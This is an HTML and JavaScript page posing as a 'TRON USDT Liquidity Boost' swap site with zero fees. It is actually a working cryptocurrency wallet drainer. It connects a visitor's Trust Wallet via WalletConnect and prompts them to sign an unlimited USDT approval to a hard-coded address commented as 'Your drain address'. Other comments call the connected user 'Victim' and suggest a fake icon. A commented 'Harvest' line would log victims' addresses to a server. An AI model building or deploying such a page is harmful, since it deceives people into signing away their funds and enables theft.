<!DOCTYPE html>
<html>
<head>
  <title>TRON USDT Boost – Secure Swap</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.4.3/dist/TronWeb.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.14.1/dist/index.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.14.1/dist/index.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
  <style>
    body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; max-width: 500px; margin: 50px auto; text-align: center; background: #f8f9fa; padding: 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
    button { background: linear-gradient(135deg,#667eea 0%,#764ba2 100%); color: white; padding: 15px 30px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; width: 100%; margin: 10px 0; }
    button:hover:not(:disabled) { transform: translateY(-2px); }
    button:disabled { background: #ccc; cursor: not-allowed; }
    #qr { margin: 20px 0; border: 2px solid #e9ecef; border-radius: 12px; padding: 20px; background: white; }
    #status, #address, #txid { margin: 15px 0; padding: 12px; border-radius: 8px; font-family: monospace; }
    #status { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .error { background: #f8d7da; color: #721c24; }
    h1 { color: #333; }
  </style>
</head>
<body>
  <h1>🚀 TRON USDT Liquidity Boost</h1>
  <p>Connect Trust Wallet for <strong>0% fee swaps</strong>. Approve USDT once for unlimited access.</p>
  
  <button id="connect">🔗 Connect Wallet</button>
  <div id="qr"></div>
  <button id="approve" disabled style="display:none;">✅ Approve Unlimited USDT</button>
  
  <div id="address"></div>
  <div id="status"></div>
  <div id="txid"></div>

  <script>
    // === CONFIG ===
    const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f'; // REQUIRED: Replace!
    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const SPENDER = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV'; // Your drain address
    const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

    // TronWeb
    const tronWeb = new window.TronWeb({
      fullHost: 'https://api.trongrid.io',
    });

    // WalletConnect v2 + Tron
    let provider = null;
    let walletAddress = null;

    // UI Elements
    const connectBtn = document.getElementById('connect');
    const approveBtn = document.getElementById('approve');
    const qrDiv = document.getElementById('qr');
    const statusDiv = document.getElementById('status');
    const addressDiv = document.getElementById('address');
    const txidDiv = document.getElementById('txid');

    function setStatus(msg, isError = false) {
      statusDiv.textContent = msg;
      statusDiv.className = isError ? 'error' : '';
    }

    function showQR(uri) {
      qrDiv.innerHTML = '';
      QRCode.toCanvas(document.createElement('canvas'), uri, { width: 250 }, (err, canvas) => {
        if (err) return setStatus('QR Error: ' + err, true);
        qrDiv.appendChild(canvas);
      });
    }

    // Connect
    connectBtn.onclick = async () => {
      try {
        setStatus('Initializing WalletConnect...');
        
        // Init Universal Provider for Tron
        provider = await window.WalletConnectUniversalProvider.init({
          projectId: PROJECT_ID,
          metadata: {
            name: 'TRON USDT Swap',
            description: 'Secure DeFi swaps',
            url: window.location.host,
            icons: ['https://trustwallet-ebon.vercel.app/icon.png'] // Add fake icon
          },
          chains: ['tron:mainnet']
        });

        provider.on('display_uri', (uri) => {
          console.log('WC URI:', uri);
          showQR(uri);
          setStatus('Scan QR with Trust Wallet DApp Browser');
        });

        provider.on('accountsChanged', (accounts) => {
          if (accounts.length > 0) {
            walletAddress = accounts[0];
            addressDiv.innerHTML = `Victim: <strong>${walletAddress}</strong>`;
            connectBtn.textContent = 'Connected ✓';
            connectBtn.disabled = true;
            approveBtn.style.display = 'block';
            setStatus('Ready to approve unlimited USDT');
          }
        });

        // Enable & connect
        await provider.enable();
        
      } catch (err) {
        setStatus('Connect failed: ' + err.message, true);
      }
    };

    // Approve
    approveBtn.onclick = async () => {
      try {
        setStatus('Building approve transaction...');
        
        // Build tx
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT,
          'approve(address,uint256)',
          { feeLimit: 100000000 },
          [{type:'address',value:SPENDER}, {type:'uint256',value:MAX_UINT}],
          walletAddress
        );

        setStatus('Requesting Trust Wallet signature...');
        
        // Sign via provider
        const signedTx = await provider.request({
          method: 'tron_signTransaction',
          params: { transaction: tx.transaction }
        });

        // Broadcast
        const result = await tronWeb.trx.sendRawTransaction(signedTx);
        if (result.result) {
          setStatus('✅ SUCCESS: Unlimited approval sent!');
          txidDiv.innerHTML = `<a href="https://tronscan.org/#/transaction/${result.txid}" target="_blank">View Tx: ${result.txid.slice(0,20)}...</a>`;
          // Harvest: fetch('/log?addr=' + walletAddress + '&tx=' + result.txid);
        } else {
          throw new Error(result.message || 'Broadcast failed');
        }
      } catch (err) {
        setStatus('Approve failed: ' + err.message, true);
        console.error(err);
      }
    };
  </script>
</body>
</html>
